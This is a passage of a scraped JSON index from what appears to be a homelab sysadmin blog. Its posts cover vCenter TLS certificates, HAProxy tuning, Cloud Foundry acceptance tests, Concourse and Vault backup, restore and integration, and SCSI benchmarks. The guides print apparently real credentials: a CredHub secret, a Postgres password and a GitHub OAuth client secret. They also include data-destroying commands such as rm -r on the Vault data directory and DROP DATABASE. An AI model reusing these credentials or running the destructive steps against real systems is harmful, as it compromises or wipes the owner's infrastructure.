Algorithm\u0026#34;: \u0026#34;SHA1WithRSA\u0026#34; } Aha! That\u0026rsquo;s our smoking gun: \u0026ldquo;SHA1WithRSA\u0026rdquo; is the culprit, the reason we\u0026rsquo;ve been getting the \u0026ldquo;Provided certificate using the weak signature algorithm\u0026rdquo; error.\nLet\u0026rsquo;s explore the self-signed variant (the root certificate variant) of the \u0026ldquo;USERTrust RSA Certification Authority\u0026rdquo;, this time with openssl. We can use a simple egrep to extract the information we need:\ncurl https://crt.sh/?d=1199354 | \\ openssl x509 -noout -text | \\ egrep \u0026#34;Issuer:|Subject:|Signature Algorithm:\u0026#34; produces:\nSignature Algorithm: sha384WithRSAEncryption Issuer: C=US, ST=New Jersey, L=Jersey City, O=The USERTRUST Network, CN=USERTrust RSA Certification Authority Subject: C=US, ST=New Jersey, L=Jersey City, O=The USERTRUST Network, CN=USERTrust RSA Certification Authority Signature Algorithm: sha384WithRSAEncryption (We don\u0026rsquo;t know why \u0026ldquo;Signature Algorithm\u0026rdquo; is repeated).\nWe can see that this is a self-signed root certificate with a strong, SHA-384 signature algorithm. This is the root certificate we should use in our certificate chain (CA bundle).\nReferences Self-signed (not cross-signed) USERTrust RSA Certification Authority certificate https://crt.sh/?id=1199354, .pem Sectigo root certificates: https://sectigo.com/knowledge-base/detail/Sectigo-Root-Certificates/kA03l000000c4KV Information on Sectigo\u0026rsquo;s certificate chain hierarchy: https://support.sectigo.com/articles/Knowledge/Sectigo-Chain-Hierarchy-and-Intermediate-Roots Location of log file for cert-related errors on vCenter: /var/log/vmware/certificatemanagement/certificatemanagement-svcs.log To reset all certificates on VCSA 8: https://docs.vmware.com/en/VMware-vSphere/8.0/vsphere-authentication/GUID-5572C39C-1556-4ACC-B12D-26E3BCBC4D56.html VMware discussion of the dreaded \u0026ldquo;Please provide the strong signature algorithm certificate\u0026rdquo; error: https://communities.vmware.com/t5/vCenter-Server-Discussions/SSL-Certificate-Error-vCenter-8/td-p/2933907 Getting rid of unneeded root certificates: https://communities.vmware.com/t5/VMware-vCenter-Discussions/Cleanup-old-trusted-root-certificates-from-PSC/m-p/472299/highlight/true#M5344 Mozilla\u0026rsquo;s list of approximately 150 root certificates: https://wiki.mozilla.org/CA/Included_Certificates How to Install a TLS Certificate on vCenter Server Appliance (VCSA) 7: https://vnote42.net/2020/04/15/replace-machine-certificate-in-vsphere-7/ Our assets: CSR (vcenter-80.nono.io.csr) Certificate (vcenter-80.nono.io.crt) CA Bundle/Certificate Chain (vcenter-80_nono_io.ca-bundle) Corrections \u0026amp; Updates 2022-11-05\nExpanded the \u0026ldquo;How to Determine if a Certificate is a Self-Signed Certificate\u0026rdquo; section to include the signature algorithm, and included the problematic root cert to drive home the cause of the error.\n2023-01-05\nWe mistakenly told users to upload the CA bundle when they should have uploaded the key. Thanks @obsidianindy.\n","permalink":"https://blog.nono.io/post/vcenter_8.0_tls/","summary":"Quickstart First, create your key and your CSR (Certificate Signing Request). In the following example, we are creating a CSR for our vCenter host, \u0026ldquo;vcenter-80.nono.io\u0026rdquo;:\nCN=vcenter-80.nono.io # \u0026#34;CN\u0026#34; is the abbreviation for \u0026#34;Common Name\u0026#34; openssl genrsa -out $CN.key 3072 openssl req \\ -new \\ -key $CN.key \\ -out $CN.csr \\ -sha256 \\ -subj \u0026#34;/C=US/ST=California/L=San Francisco/O=nono.io/OU=homelab/CN=${CN}/emailAddress=brian.cunnie@gmail.com\u0026#34; \\ -config \u0026lt;(cat \u0026lt;\u0026lt;EOF [ req ] distinguished_name = req_distinguished_name req_extensions = req_ext [ req_distinguished_name ] [ req_ext ] subjectAltName = @alt_names [alt_names] DNS.","title":"How to Install a TLS Certificate on vCenter Server Appliance (VCSA) 8.0"},{"content":" Network Diagram. We want to maximize the throughput from the blue box (the client) to the green box (HAProxy)\nSummary We were able to push through almost 450 MB/sec through HAProxy (which terminated our SSL) by carefully matching our 4-core HAProxy with 2 x 4-core Gorouters (which were on a much slower ESXi host).\nResults Bandwidth MB/second Configuration 201.27MB 1 HAProxy: 1 vCPU 136.47MB 1 HAProxy: 2 vCPUs 270.56MB 2 Gorouters: 1 vCPU 350.48MB 2 Gorouters: 2 vCPUs 447.49MB 1 HAProxy, 2 Gorouters: 4 vCPUs 0. HAProxy with 1 vCPU HAProxy had only 1 vCPU during this iteration, and the CPU was maxed to 100% during the test (according to htop). We suspect that TLS was the culprit for much of the traffic: HAProxy terminated TLS traffic inbound, and initiated TLS to the Gorouters.\n1. HAProxy with 2 vCPUs Surprisingly, adding a second vCPU (2 vCPUs, 1 socket) made things worse; bandwidth dropped \u0026gt;30%.\nAlthough the HAProxy never maxed-out its CPU, the Gorouter did, pinned at 100% during the duration of the test (htop).\n2. Two Gorouters Previously we only had 1 Gorouter backing the HAProxy, but now we doubled it to 2 Gorouters. The doubling of VMs notwithstanding, the Gorouters\u0026rsquo; CPUs were still pegged at 100%.\n2. Two Gorouters with 2 vCPUs Previously our Gorouters had 1 vCPU. We doubled it to 2 vCPUs. We saw that our HAProxy\u0026rsquo;s 2 cores were pegged at 100%, and the Gorouters\u0026rsquo; 2 cores were almost maxed-out.\nNote that the Gorouters are on a Xeon which can be charitably characterized as \u0026ldquo;the world\u0026rsquo;s slowest Xeon\u0026rdquo;. In other words, don\u0026rsquo;t extrapolate the ratios of HAProxies to Gorouters from this particularly lopsided setup.\n2. One HAProxy, Two Gorouters with 4 vCPUs We were able to push through almost 450 MB/s, but the HAProxy\u0026rsquo;s CPU was almost, but not quite, 100%. We\u0026rsquo;ve reached the hardware limits of our homelab—we don\u0026rsquo;t have enough physical cores to tune any further, so we bring this post to a close.\nReferences Test suite: https://github.com/wg/wrk Test suite invocation: ./wrk -t8 -c32 -d60s https://10.9.250.10/10mb -H \u0026#34;Host: dora.foundry.fun\u0026#34; Our 10MB app: https://github.com/cloudfoundry/cf-acceptance-tests Our change to the code (thanks Matthew Kocher!): --- a/assets/dora/dora.rb +++ b/assets/dora/dora.rb @@ -39,6 +39,11 @@ class Dora \u0026lt; Sinatra::Base end end + get \u0026#39;/10mb\u0026#39; do + require \u0026#39;securerandom\u0026#39; + $ten_mb ||= SecureRandom.random_bytes(10 * 1024 * 1024) + end + ","permalink":"https://blog.nono.io/post/tuning_haproxy/","summary":"Network Diagram. We want to maximize the throughput from the blue box (the client) to the green box (HAProxy)\nSummary We were able to push through almost 450 MB/sec through HAProxy (which terminated our SSL) by carefully matching our 4-core HAProxy with 2 x 4-core Gorouters (which were on a much slower ESXi host).\nResults Bandwidth MB/second Configuration 201.27MB 1 HAProxy: 1 vCPU 136.47MB 1 HAProxy: 2 vCPUs 270.56MB 2 Gorouters: 1 vCPU 350.","title":"Tuning HAProxy in a vSphere Environment"},{"content":" The Cloud Foundry Acceptance Tests are the gold standard to test the proper functioning of your Cloud Foundry deployment. This guide tells you how to run them. When in doubt, refer to the README.\nQuick Start cd ~/workspace/ git clone git@github.com:cloudfoundry/cf-acceptance-tests.git cd cf-acceptance-tests . ./.envrc bin/update_submodules cp example-cats-config.json cats-config.json export CONFIG=cats-config.json cf api api.cf.nono.io # or whatever your Cloud Foundry\u0026#39;s API endpoint is cf login -u admin cf create-space -o system system # don\u0026#39;t worry if it\u0026#39;s already created cf t -o system -s system cf enable-feature-flag diego_docker # necessary if you\u0026#39;re running the Docker tests (`\u0026#34;include_docker\u0026#34;: true`) Let\u0026rsquo;s configure our cats-config.json. You should know the values for all the replacements except credhub_secret; we\u0026rsquo;ll explain how to get that next:\n-IN DEVELOPMENT { - \u0026#34;api\u0026#34;: \u0026#34;api.DOMAIN.com\u0026#34;, - \u0026#34;apps_domain\u0026#34;: \u0026#34;DOMAIN.com\u0026#34;, + \u0026#34;api\u0026#34;: \u0026#34;api.cf.nono.io\u0026#34;, + \u0026#34;apps_domain\u0026#34;: \u0026#34;foundry.fun\u0026#34;, \u0026#34;admin_user\u0026#34;: \u0026#34;admin\u0026#34;, - \u0026#34;admin_password\u0026#34;: \u0026#34;PASSWORD\u0026#34;, + \u0026#34;admin_password\u0026#34;: \u0026#34;MySecretAdminPassword\u0026#34;, \u0026#34;credhub_mode\u0026#34;: \u0026#34;assisted\u0026#34;, - \u0026#34;credhub_client\u0026#34;: \u0026#34;CREDHUB_CLIENT\u0026#34;, - \u0026#34;credhub_secret\u0026#34;: \u0026#34;CREDHUB_SECRET\u0026#34;, + \u0026#34;credhub_client\u0026#34;: \u0026#34;credhub_admin_client\u0026#34;, + \u0026#34;credhub_secret\u0026#34;: \u0026#34;XDBlXvmH7aN3IG2czVfzvitu5dTHIj\u0026#34;, \u0026#34;artifacts_directory\u0026#34;: \u0026#34;logs\u0026#34;, \u0026#34;skip_ssl_validation\u0026#34;: true, \u0026#34;timeout_scale\u0026#34;: 1, By default you\u0026rsquo;re running the CredHub tests, so you need credhub_secret, but getting it is a multi-step affair. First, get the credentials to communicate with the BOSH Director\u0026rsquo;s CredHub:\nbosh int --path /instance_groups/name=bosh/jobs/name=uaa/properties/uaa/scim/users/name=credhub_cli_user bosh-vsphere.yml [where bosh-vsphere.yml is your BOSH Director\u0026rsquo;s manifest]\nThe output should look something like the following:\ngroups: - credhub.read - credhub.write name: credhub_cli_user password: SomeKrazyPassword Now that we have the password (\u0026ldquo;SomeKrazyPassword\u0026rdquo;), let\u0026rsquo;s authenticate to the BOSH Director\u0026rsquo;s CredHub using the CredHub CLI:\ncredhub api bosh-vsphere.nono.io:8844 --skip-tls-validation # assuming your BOSH Director\u0026#39;s hostname is \u0026#34;bosh-vsphere.nono.io\u0026#34; credhub login --username=credhub_cli_user --password=SomeKrazyPassword credhub find -n / # we don\u0026#39;t need this, but it gives us a complete list of creds credhub get -n /bosh-vsphere/cf/credhub_admin_client_secret # your path might be different, e.g. \u0026#34;/bosh/TAS/credhub_admin_client_secret\u0026#34; id: 1b238b69-72ac-4a73-a124-b67da71da572 name: /bosh-vsphere/cf/credhub_admin_client_secret type: password value: XDBlXvmH7aN3IG2czVfzvitu5dTHIj version_created_at: \u0026#34;2021-11-18T23:25:53Z\u0026#34; Aha! Now in our cats-config.json, set \u0026quot;credhub_secret\u0026quot;: \u0026quot;XDBlXvmH7aN3IG2czVfzvitu5dTHIj\u0026quot;.\nBut we\u0026rsquo;re still not done: we need to create a security group that allows the apps to communicate with Cloud Foundry\u0026rsquo;s CredHub (separate \u0026amp; distinct from the BOSH Director\u0026rsquo;s CredHub) (yes, it\u0026rsquo;s confusing).\ncf create-security-group credhub \u0026lt;(echo \u0026#39;[{\u0026#34;protocol\u0026#34;:\u0026#34;tcp\u0026#34;,\u0026#34;destination\u0026#34;:\u0026#34;10.0.0.0/8\u0026#34;,\u0026#34;ports\u0026#34;:\u0026#34;8443,8844\u0026#34;,\u0026#34;description\u0026#34;:\u0026#34;credhub\u0026#34;}]\u0026#39;) cf bind-running-security-group credhub cf bind-staging-security-group credhub Now let\u0026rsquo;s run our tests!\nbin/test -nodes=6 Troubleshooting Docker Failures [Fail] [docker] Docker Application Lifecycle running a docker app with a start command [BeforeEach] retains its start command through starts and stops /home/cunnie/workspace/cf-acceptance-tests/docker/docker_lifecycle.go:53 [Fail] [docker] Docker Application Lifecycle running a docker app without a start command [BeforeEach] handles docker-defined metadata and environment variables correctly /home/cunnie/workspace/cf-acceptance-tests/docker/docker_lifecycle.go:80 [Fail] [docker] Docker Application Lifecycle running a docker app without a start command [BeforeEach] when env vars are set with \u0026#39;cf set-env\u0026#39; prefers the env vars from cf set-env over those in the Dockerfile /home/cunnie/workspace/cf-acceptance-tests/docker/docker_lifecycle.go:80 Means you\u0026rsquo;ve forgotten to cf enable-feature-flag diego_docker.\nTroubleshoot Service Binding Failures (CredHub) [Fail] [credhub] service bindings during staging [BeforeEach] [assisted credhub] has CredHub references in VCAP_SERVICES interpolated /home/cunnie/workspace/cf-acceptance-tests/credhub/service_bindings.go:123 [Fail] [credhub] service bindings during staging [BeforeEach] [non-assisted credhub] still contains CredHub references in VCAP_SERVICES /home/cunnie/workspace/cf-acceptance-tests/credhub/service_bindings.go:123 [Fail] [credhub] service bindings during runtime service bindings to credhub enabled broker [assisted credhub] [BeforeEach] the broker returns credhub-ref in the credentials block /home/cunnie/workspace/cf-acceptance-tests/credhub/service_bindings.go:123 [Fail] [credhub] service bindings during runtime service bindings to credhub enabled broker [assisted credhub] [BeforeEach] the bound app gets CredHub refs in VCAP_SERVICES interpolated /home/cunnie/workspace/cf-acceptance-tests/credhub/service_bindings.go:123 Means you\u0026rsquo;ve either set the wrong credhub_secret in cats-config.json or you forgot to create \u0026amp; bind the credhub security group.\n","permalink":"https://blog.nono.io/post/underground_guide_to_cf_acceptance/","summary":"The Cloud Foundry Acceptance Tests are the gold standard to test the proper functioning of your Cloud Foundry deployment. This guide tells you how to run them. When in doubt, refer to the README.\nQuick Start cd ~/workspace/ git clone git@github.com:cloudfoundry/cf-acceptance-tests.git cd cf-acceptance-tests . ./.envrc bin/update_submodules cp example-cats-config.json cats-config.json export CONFIG=cats-config.json cf api api.cf.nono.io # or whatever your Cloud Foundry\u0026#39;s API endpoint is cf login -u admin cf create-space -o system system # don\u0026#39;t worry if it\u0026#39;s already created cf t -o system -s system cf enable-feature-flag diego_docker # necessary if you\u0026#39;re running the Docker tests (`\u0026#34;include_docker\u0026#34;: true`) Let\u0026rsquo;s configure our cats-config.","title":"The Underground Guide to Cloud Foundry Acceptance Tests"},{"content":" Recreating the Cluster We want to recreate our cluster while preserving our Vault and Concourse data (we want to recreate our GKE regional cluster as a zonal cluster to take advantage of the GKE free tier which saves us $74.40 per month).\nNote: when we say, \u0026ldquo;recreate the cluster\u0026rdquo;, we really mean, \u0026ldquo;recreate the cluster\u0026rdquo;. We destroy the old cluster, including our worker nodes and persistent volumes.\nBackup Vault In the following example, our storage path is /vault/data, but there\u0026rsquo;s a chance that yours is different. If it is, replace occurrences of /vault/data with your storage path:\n# Find the storage path kubectl exec -it vault-0 -n vault -- cat /tmp/storageconfig.hcl # look for storage.path, e.g. \u0026#34;/vault/data\u0026#34; # We need to do this in two steps because Vault\u0026#39;s tar is BusyBox\u0026#39;s, not GNU\u0026#39;s kubectl exec -it -n vault vault-0 -- tar czf /tmp/vault_bkup.tgz /vault/data # We encode it in base64 to avoid \u0026#34;tar: Damaged tar archive\u0026#34; kubectl exec -it -n vault vault-0 -- base64 /tmp/vault_bkup.tgz \u0026gt; ~/Downloads/vault_bkup.tgz.base64 Note: this backup is very specific to our configuration; if your configuration is different (e.g. Consul storage backend, Disaster Recovery Replication enabled), then refer to the Vault documentation.\nCheck that the backup is valid (that the .tar file isn\u0026rsquo;t corrupted):\nbase64 -d \u0026lt; ~/Downloads/vault_bkup.tgz.base64 | tar tvf - Backup Concourse CI\u0026rsquo;s Database Note: the name of our Helm Concourse CI release is \u0026ldquo;ci-nono-io\u0026rdquo; (its URL is https://ci.nono.io). Remember: when you see it, substitute the name of your Helm Concourse CI release. You\u0026rsquo;ll see the release name in pod names (\u0026ldquo;ci-nono-io-postgresql-0\u0026rdquo;), secrets (\u0026ldquo;ci-nono-io-postgresql\u0026rdquo;), etc. Similarly, our Helm Vault release\u0026rsquo;s name is \u0026ldquo;vault\u0026rdquo;. Yours is probably the same.\nNow we move onto backup up Concourse. In the command below, our Concourse CI\u0026rsquo;s PostgreSQL\u0026rsquo;s pod\u0026rsquo;s name is ci-nono-io-postgresql-0. Substitute your pod\u0026rsquo;s name.\n# the postgres user \u0026#34;concourse\u0026#34;\u0026#39;s password is \u0026#34;concourse\u0026#34; echo concourse | \\ kubectl exec -it ci-nono-io-postgresql-0 -- \\ pg_dump -Fc -U concourse concourse \\ \u0026gt; ~/Downloads/concourse.dump Check that the backup is valid. The following command should complete without errors:\npg_restore -l ~/Downloads/concourse.dump Recreate the Cluster We burn our cluster to the ground \u0026amp; recreate it from scratch:\nterraform destroy ... Restore Vault We\u0026rsquo;ve deployed Vault (helm install vault hashicorp/vault ....), now let\u0026rsquo;s restore our old vault\u0026rsquo;s data:\n# Confirm the storage path kubectl exec -it vault-0 -n vault -- cat /tmp/storageconfig.hcl # look for storage.path, e.g. \u0026#34;/vault/data\u0026#34; kubectl exec -it vault-0 -n vault -- sh -c \u0026#34;rm -r /vault/data/*\u0026#34; kubectl exec -it -n vault vault-0 -- \\ sh -c \u0026#34;base64 -d | tar xzvf -\u0026#34; \u0026lt; ~/Downloads/vault_bkup.tgz.base64 At this point we can browse to our vault (ours is https://vault.nono.io) and unseal it. Our original unsealing keys should work. We log in using our root token and browse to make sure our secrets are there.\nRestore Concourse We\u0026rsquo;ve deployed Concourse (helm install ci-nono-io concourse/concourse ...), but haven\u0026rsquo;t logged in or configured any pipelines. The install is pristine. Let\u0026rsquo;s restore the database. First, let\u0026rsquo;s get the postgres database\u0026rsquo;s postgres user\u0026rsquo;s password. Our secret is ci-nono-io-postgresql; substitute yours appropriately in the following command:\nkubectl get secret ci-nono-io-postgresql -o json \\ | jq -r \u0026#39;.data.\u0026#34;postgresql-postgres-password\u0026#34;\u0026#39; \\ | base64 -d In our case, the postgres user\u0026rsquo;s password is \u0026ldquo;uywhz4bUkJ\u0026rdquo;.\nOur PostgreSQL pod\u0026rsquo;s name is ci-nono-io-postgresql-0; substitute yours in the command below:\nkubectl cp ~/Downloads/concourse.dump ci-nono-io-postgresql-0:/tmp/concourse.dump kubectl exec -it ci-nono-io-postgresql-0 -- bash psql --username=postgres # enter the password from above Now let\u0026rsquo;s drop the old database. Note that we must first disallow additional database connections and terminate existing database connections before dropping the database:\nUPDATE pg_database SET datallowconn = false WHERE datname = \u0026#39;concourse\u0026#39;; SELECT pg_terminate_backend (pid) FROM pg_stat_activity WHERE pg_stat_activity.datname = \u0026#39;concourse\u0026#39;; DROP DATABASE concourse; CREATE DATABASE concourse; EXIT; Use the postgres password again when prompted below:\npg_restore --dbname=concourse --username=postgres /tmp/concourse.dump Now browse to your Concourse CI. Try logging in. Try kicking off a build. If your resources are having trouble, yielding messages such as \u0026ldquo;run check: find or create container on worker \u0026hellip; disappeared from worker\u0026rdquo;, wait a few minutes. It should clear up on its own.\nTroubleshooting If you uninstall Concourse CI, helm uninstall ..., remember to delete any lingering Persistent Volume Claims (pvc), kubectl delete pvc ..., before reinstalling, lest your postgresql-postgres-password secret becomes out-of-sync with the actual password.\nIf, when triggering a Concourse job that depends on a Vault secret, the job aborts with the error failed to interpolate task config: undefined vars:, then you probably forgot to --set secrets.vaultAuthParam=... when helm install ci-nono-io concourse/concourse .... Fix by running helm upgrade ... --set secrets.vaultAuthParam=...\nReferences How to Backup PostgreSQL Database for Concourse CI. We have mixed feelings about this post: on one hand, they do a nice description of backing up the Concourse CI database; on the other hand, they never bother restoring the database to make sure their procedure is correct (spoiler: it isn\u0026rsquo;t). ","permalink":"https://blog.nono.io/post/concourse_on_k8s-6/","summary":"Recreating the Cluster We want to recreate our cluster while preserving our Vault and Concourse data (we want to recreate our GKE regional cluster as a zonal cluster to take advantage of the GKE free tier which saves us $74.40 per month).\nNote: when we say, \u0026ldquo;recreate the cluster\u0026rdquo;, we really mean, \u0026ldquo;recreate the cluster\u0026rdquo;. We destroy the old cluster, including our worker nodes and persistent volumes.\nBackup Vault In the following example, our storage path is /vault/data, but there\u0026rsquo;s a chance that yours is different.","title":"Concourse CI on Kubernetes (GKE), Part 6: Concourse \u0026 Vault: Backup \u0026 Restore"},{"content":"Is it worth switching your VMware vSphere VM\u0026rsquo;s SCSI (small computer system interface) from the LSI Logic Parallel controller to the VMware Paravirtual SCSI controller? Except for ultra-high-end database servers (\u0026gt; 1M IOPS ( input/output operations per second)), the answer is \u0026ldquo;no\u0026rdquo;; the difference is negligible.\nOur benchmarks show that VMware\u0026rsquo;s Paravirtual SCSI (small computer system interface) controller offered a 2-3% performance increase in IOPS (I/O (input/output) operations per second) over the LSI Logic Parallel SCSI controller at the cost of a similar decrease in sequential performance (both read \u0026amp; write). Additionally the Paravirtual SCSI controller (pvscsi) had a slight reduction in CPU (central processing unit) usage on the host (best-case scenario is 3% lower CPU usage).\nThe Benchmarks The Paravirtual has better IOPS than the LSI Logic, but worse sequential throughput.\nOn average the Paravirtual Driver\u0026rsquo;s (red) IOPS performance is 2.5% better than the LSI Logic\u0026rsquo;s\nAlthough not consistently faster, the LSI Logic averages 2% faster than the Paravirtual on sequential read operations\nThe LSI Logic\u0026rsquo;s sequential write performance is consistently faster than the Paravirtual\u0026rsquo;s by an average of 4%\nHost CPU Utilization The ESXi host CPU utilization was trickier to measure—we had to eyeball it. You can see the two charts below, taken while we were running our benchmarks. Our guess is that the Paravirtual driver used ~3% less CPU than the LSI Logic.\nNote that 3% is a best-case scenario (you\u0026rsquo;re unlikely to get 10% improvement): the benchmarks were taken on what we affectionately refer to as \u0026ldquo;The world\u0026rsquo;s slowest Xeon\u0026rdquo;, i.e. the Intel Xeon D-1537, which clocks in at an anemic 1.7GHz (side note: We purchased it for its low TDP (Thermal Design Power), not its speed). In other words, this processor is so slow that any improvement in CPU efficiency is readily apparent.\nBenchmark Setup We paired a slow CPU with a fast disk:\nSamsung SSD 960 2TB M.2 2280 PRO Supermicro X10SDV-8C-TLN4F+ motherboard with a soldered-on 1.7 GHz 8-core Intel Xeon Processor D-1537, and 128 GiB RAM. We used gobonniego to benchmark the performance.\nWe ran each benchmark for 1 hour.\nWe configured the VMs with 4 vCPUs, 1 GiB RAM and a 20 GiB drive. We used 4 CPUs so that the Xeon\u0026rsquo;s slow speed wouldn\u0026rsquo;t handicap the benchmark results (we wanted the disk to be the bottleneck, not the CPU).\nThe Samsung NVMe SSD 960 Pro is a gold standard for NVMe disk performance.\nWhy These Benchmarks Are Flawed In the spirit of full disclosure, we\u0026rsquo;d like to point out the shortcomings of our benchmarks:\nWe only tested one type of datastore. We tested an NVMe (non-volatile memory express) datastore, but it would have been interesting to test VMware\u0026rsquo;s vSAN (virtual storage area network).\nWe only ran the benchmark for an hour. Had we run the benchmark longer, we would have seen different performance curves. For example, when we ran the benchmarks back-to-back we saw degradation of the throughput from almost 2 GB/s to slightly more than 1 GB/s on the sequential read \u0026amp; write tests. We attribute this degradation to saturation of the Samsung controller.\nWe never modified the kernel settings to enhance pvscsi performance. For example, went with the default settings for queue depth for device (64) and adapter (254), but this VMware knowledgebase (KB) article suggests increasing those to 254 and 1024, respectively.\nWe only tested Linux. Windows performance may be different.\nWe benchmarked slightly different versions of Linux. We tested against two very-close versions of Ubuntu Bionic, but they weren\u0026rsquo;t the exact same version. Had we used completely identical versions, we may have seen different performance numbers.\nReferences Which vSCSI controller should I choose for performance?, Mark Achetemichuk, \u0026ldquo;PVSCSI and LSI Logic Parallel/SAS are essentially the same when it comes to overall performance capability [for customers not producing 1 million IOPS]\u0026rdquo;\nAchieving a Million I/O Operations per Second from a Single VMware vSphere® 5.0 Host, \u0026ldquo;a PVSCSI adapter provides 8% better throughput at 10% lower CPU cost\u0026rdquo;. Our benchmarks show 2.5%, 3% respectively.\nLarge-scale workloads with intensive I/O patterns might require queue depths significantly greater than Paravirtual SCSI default values (2053145), \u0026ldquo;\u0026hellip; increase PVSCSI queue depths to 254 (for device) and 1024 (for adapter)\u0026rdquo;\nRaw Benchmark results (JSON-formatted).\n","permalink":"https://blog.nono.io/post/pvscsi/","summary":"Is it worth switching your VMware vSphere VM\u0026rsquo;s SCSI (small computer system interface) from the LSI Logic Parallel controller to the VMware Paravirtual SCSI controller? Except for ultra-high-end database servers (\u0026gt; 1M IOPS ( input/output operations per second)), the answer is \u0026ldquo;no\u0026rdquo;; the difference is negligible.\nOur benchmarks show that VMware\u0026rsquo;s Paravirtual SCSI (small computer system interface) controller offered a 2-3% performance increase in IOPS (I/O (input/output) operations per second) over the LSI Logic Parallel SCSI controller at the cost of a similar decrease in sequential performance (both read \u0026amp; write).","title":"Disk Controller Benchmarks: VMware Paravirtual's vs. LSI Logic Parallel's"},{"content":" In our previous post, we configured our GKE Concourse CI server, which was the capstone of the series. But we were wrong: this post is the capstone in the series. In this post, we install Vault and configure our Concourse CI server to use Vault to retrieve secrets.\nInstallation Most of these instructions are derived from the Hashicorp tutorial, Vault on Kubernetes Deployment Guide.\nCreate a DNS A record which points to the IP address of your GKE load balancer. In our case, we created vault.nono.io which points to 104.155.144.4.\nCreate the vault namespace and deploy the TLS issuers to that namespace. Replace brian.cunnie@gmail.com with your email address:\nkubectl create namespace vault kubectl apply -f \u0026lt;( curl -o- https://cert-manager.io/docs/tutorials/acme/example/staging-issuer.yaml | sed \u0026#39;s/user@example.com/brian.cunnie@gmail.com/\u0026#39;) -n vault kubectl apply -f \u0026lt;( curl -o- https://cert-manager.io/docs/tutorials/acme/example/production-issuer.yaml | sed \u0026#39;s/user@example.com/brian.cunnie@gmail.com/\u0026#39;) -n vault Let\u0026rsquo;s create vault-values.yml, which contains the necessary customizations for our Vault server. Replace vault.nono.io with your DNS record:\ninjector: enabled: false server: ingress: enabled: true labels: traffic: external annotations: cert-manager.io/issuer: \u0026#34;letsencrypt-prod\u0026#34; kubernetes.io/ingress.class: \u0026#34;nginx\u0026#34; hosts: - host: vault.nono.io paths: [] tls: - hosts: - vault.nono.io secretName: vault.nono.io ui: enabled: true Let\u0026rsquo;s use Helm to install Vault:\nhelm repo add hashicorp https://helm.releases.hashicorp.com helm install vault hashicorp/vault \\ --namespace vault \\ -f vault-values.yml \\ --wait Let\u0026rsquo;s initialize our pristine Vault server. We want only one key (\u0026quot;secret_shares\u0026quot;: 1) to unseal the vault; we\u0026rsquo;re not a nuclear missile silo that needs three separate keys to trigger a launch.\ncurl \\ --request POST \\ --data \u0026#39;{\u0026#34;secret_shares\u0026#34;: 1, \u0026#34;secret_threshold\u0026#34;: 1}\u0026#39; \\ https://vault.nono.io/v1/sys/init | jq Record root_token and keys; you\u0026rsquo;ll need them to unseal the Vault and log in, respectively. Replace VAULT_KEY and VAULT_TOKEN with your keys and root_token:\nexport VAULT_KEY=5a302397xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx export VAULT_TOKEN=s.QmByxxxxxxxxxxxxxxxxxxxx export VAULT_ADDR=https://vault.nono.io curl \\ --request POST \\ --data \u0026#39;{\u0026#34;key\u0026#34;: \u0026#34;\u0026#39;$VAULT_KEY\u0026#39;\u0026#34;}\u0026#39; \\ $VAULT_ADDR/v1/sys/unseal | jq # check initialization status curl $VAULT_ADDR/v1/sys/init Concourse Integration Much of this section was shamelessly copied from the excellent canonical Concourse documentation, The Vault credential manager.\nConfigure the Secrets Engine Create a key-value concourse/ path in Vault for Concourse to access its secrets:\nvault secrets enable -version=1 -path=concourse kv Create concourse-policy.hcl so that our Concourse server has access to that path:\npath \u0026#34;concourse/*\u0026#34; { policy = \u0026#34;read\u0026#34; } Let\u0026rsquo;s upload that policy to Vault:\nvault policy write concourse concourse-policy.hcl Configure a Vault approle for Concourse Let\u0026rsquo;s enable the approle backend on Vault:\nvault auth enable approle Let\u0026rsquo;s create the Concourse approle:\nvault write auth/approle/role/concourse policies=concourse period=1h We need the approle\u0026rsquo;s role_id and secret_id to set in our Concourse server:\nvault read auth/approle/role/concourse/role-id # role_id 045e3a37-6cc4-4f6b-4312-36eed80f7adc vault write -f auth/approle/role/concourse/secret-id # secret_id 59b8015d-8d4a-fcce-f689-xxxxxxxxxxxx Configure Concourse to Use Vault Let\u0026rsquo;s configure our Concourse deployment to use Vault. We append yet even more arguments to our already-gargantuan [values_file] command to deploy Concourse. Replace gke-nono-io with the name of your Helm release, gke.nono.io with the hostname of your Concourse server, and replace all the various and sundry credentials, too:\nhelm upgrade gke-nono-io concourse/concourse \\ --set concourse.web.externalUrl=https://gke.nono.io \\ --set concourse.web.auth.duration=240h \\ --set \u0026#39;web.ingress.enabled=true\u0026#39; \\ --set \u0026#39;web.ingress.annotations.cert-manager\\.io/issuer=letsencrypt-prod\u0026#39; \\ --set \u0026#39;web.ingress.annotations.kubernetes\\.io/ingress.class=nginx\u0026#39; \\ --set \u0026#39;web.ingress.hosts={gke.nono.io}\u0026#39; \\ --set \u0026#39;web.ingress.tls[0].hosts[0]=gke.nono.io\u0026#39; \\ --set \u0026#39;web.ingress.tls[0].secretName=gke.nono.io\u0026#39; \\ \\ --set-file secrets.sessionSigningKey=secrets/session_signing_key \\ --set-file secrets.hostKey=secrets/tsa_host_key \\ --set-file secrets.hostKeyPub=secrets/tsa_host_key.pub \\ --set-file secrets.workerKey=secrets/worker_key \\ --set-file secrets.workerKeyPub=secrets/worker_key.pub \\ \\ --set secrets.localUsers=\u0026#34;\u0026#34; \\ --set concourse.web.localAuth.enabled=false \\ --set concourse.web.auth.mainTeam.github.org=blabbertabber \\ --set concourse.web.auth.github.enabled=true \\ --set secrets.githubClientId=5e4ffee9dfdced62ebe3 \\ --set secrets.githubClientSecret=549e10b1680ead9cafa30d4c9a715681cec9b074 \\ \\ --set concourse.web.vault.enabled=true \\ --set concourse.web.vault.url=https://vault.nono.io:443 \\ --set concourse.web.vault.authBackend=approle \\ --set concourse.web.vault.useAuthParam=true \\ --set secrets.vaultAuthParam=\u0026#34;role_id:045e3a37-6cc4-4f6b-4312-36eed80f7adc\\\\,secret_id:59b8015d-8d4a-fcce-f689-xxxxxxxxxxxx\u0026#34; \\ \\ --wait Gotchas: you need :443 at the end of the vault URL [443], and you need the double-backslash before the comma in the vaultAuthParam [double_backslash].\nPutting It Together Let\u0026rsquo;s create a secret which we\u0026rsquo;ll interpolate into our pipeline. We create the key under the Vault path concourse/main (main is our Concourse team\u0026rsquo;s name. If you\u0026rsquo;re not sure what your Concourse team name, it\u0026rsquo;s probably main):\nvault kv put concourse/main/ozymandias-secret value=\u0026#34;Look on my Works, ye Mighty, and despair\\!\u0026#34; Let\u0026rsquo;s create a simple Concourse pipeline definition, pipeline-ozymandias.yml\njobs: 